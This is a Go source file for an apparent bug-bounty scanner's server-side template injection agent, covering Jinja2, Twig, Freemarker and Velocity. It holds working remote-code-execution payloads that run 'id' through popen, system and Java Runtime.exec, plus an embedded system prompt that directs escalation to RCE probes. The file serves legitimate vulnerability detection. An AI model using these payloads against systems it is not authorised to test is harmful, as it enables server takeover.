// Package ssti implements the Server-Side Template Injection specialist agent.
//
// Tests Jinja2, Twig, Freemarker, and Velocity template engines for SSTI
// by injecting math expressions and engine-specific probes.
package ssti

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// Engine labels for detected SSTI
const (
	EngineJinja2     = "jinja2"
	EngineTwig       = "twig"
	EngineFreemarker = "freemarker"
	EngineVelocity   = "velocity"
	EngineGeneric    = "generic"
)

// Agent implements the Specialist interface for SSTI detection.
type Agent struct {
	systemPrompt string
}

// New creates a new SSTI specialist agent.
func New() *Agent {
	return &Agent{systemPrompt: defaultSystemPrompt}
}

func (a *Agent) Name() string         { return "SSTI Agent" }
func (a *Agent) ID() string           { return "ssti" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// sstiProbe holds a template injection probe.
type sstiProbe struct {
	payload       string
	engine        string
	detectMath    bool   // true if response should contain "49"
	detectMarker  string // specific string to look for in response
	rceIndicator  bool   // true if this probe should produce RCE evidence
}

var probes = []sstiProbe{
	// --- Generic math probes (engine fingerprinting) ---
	{payload: "{{7*7}}", engine: EngineGeneric, detectMath: true},
	{payload: "${7*7}", engine: EngineGeneric, detectMath: true},
	{payload: "#{7*7}", engine: EngineGeneric, detectMath: true},
	{payload: "<%= 7*7 %>", engine: EngineGeneric, detectMath: true},

	// --- Jinja2 specific ---
	{payload: "{{7*'7'}}", engine: EngineJinja2, detectMarker: "7777777"},
	{payload: "{{config}}", engine: EngineJinja2, detectMarker: "SECRET_KEY"},
	{
		payload:      "{{''.__class__.__mro__[1].__subclasses__()}}",
		engine:       EngineJinja2,
		detectMarker: "type",
	},
	{
		payload:     "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
		engine:      EngineJinja2,
		detectMarker: "uid=",
		rceIndicator: true,
	},

	// --- Twig specific ---
	{payload: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}", engine: EngineTwig, detectMarker: "exec"},
	{payload: "{{['id']|filter('system')}}", engine: EngineTwig, detectMarker: "uid=", rceIndicator: true},

	// --- Freemarker specific ---
	{payload: "${7*7}", engine: EngineFreemarker, detectMath: true},
	{
		payload:      "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
		engine:       EngineFreemarker,
		detectMarker: "uid=",
		rceIndicator: true,
	},
	{
		payload:      "<#assign cl=7.class>${cl.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(cl.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
		engine:       EngineFreemarker,
		detectMarker: "Process",
		rceIndicator: true,
	},

	// --- Velocity specific ---
	{
		payload: "#set($e=\"e\")${e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"e\".class).invoke(e.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}",
		engine:  EngineVelocity,
		detectMarker: "Process",
		rceIndicator: true,
	},
	{payload: "#set($x=7*7)${x}", engine: EngineVelocity, detectMath: true},
}

// ProcessItem tests URL parameters for Server-Side Template Injection.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}

	// Build list of parameters to test
	params := extractParams(u)

	fc := base.NewFuzzClient()
	var findings []*base.Finding

	for _, param := range params {
		for _, probe := range probes {
			result := fc.ProbeGET(ctx, targetURL, param, probe.payload)
			if result.Error != nil {
				continue
			}

			conf := 0.0
			evidence := map[string]interface{}{
				"engine":      probe.engine,
				"payload":     probe.payload,
				"status_code": result.StatusCode,
			}

			switch {
			case probe.rceIndicator && probe.detectMarker != "" && strings.Contains(result.Body, probe.detectMarker):
				// RCE confirmed
				conf = 0.95
				evidence["rce_confirmed"] = true
				evidence["rce_marker"] = probe.detectMarker

			case probe.detectMath && strings.Contains(result.Body, "49"):
				// Math expression evaluated
				conf = 0.95
				evidence["math_eval"] = true
				evidence["expected"] = "49"

			case probe.detectMarker != "" && strings.Contains(result.Body, probe.detectMarker):
				// Specific marker found
				conf = 0.8
				evidence["marker_found"] = probe.detectMarker

			case base.DetectReflection(result.Body, probe.payload):
				// Payload reflected verbatim — possible but not confirmed
				conf = 0.7
				evidence["reflected"] = true
			}

			if conf == 0 {
				continue
			}

			severity := "high"
			if conf >= 0.95 {
				severity = "critical"
			}

			findings = append(findings, &base.Finding{
				Type:       "SSTI",
				URL:        targetURL,
				Parameter:  param,
				Payload:    probe.payload,
				Severity:   severity,
				Confidence: conf,
				Evidence:   evidence,
				Method:     "GET",
			})
		}
	}

	return findings, nil
}

func extractParams(u *url.URL) []string {
	seen := map[string]bool{}
	var params []string

	if u.RawQuery != "" {
		q, _ := url.ParseQuery(u.RawQuery)
		for k := range q {
			if !seen[k] {
				seen[k] = true
				params = append(params, k)
			}
		}
	}
	if len(params) == 0 {
		params = []string{"q", "search", "template", "name", "msg", "text"}
	}
	if len(params) > 5 {
		params = params[:5]
	}
	return params
}

const defaultSystemPrompt = `You are a Server-Side Template Injection (SSTI) specialist with expertise in:
- Jinja2 (Python/Flask): {{7*7}}, {{config}}, object traversal for RCE
- Twig (PHP): {{7*7}}, filter chain exploitation
- Freemarker (Java): ${7*7}, Execute?new() for RCE
- Velocity (Java): #set + class.forName RCE

Detection strategy:
1. Start with math probe {{7*7}} / ${7*7} to detect evaluation
2. Use engine-specific probes to fingerprint the template engine
3. Escalate to RCE probes if engine is confirmed

Severity: CRITICAL on math eval / RCE, HIGH on reflection.`
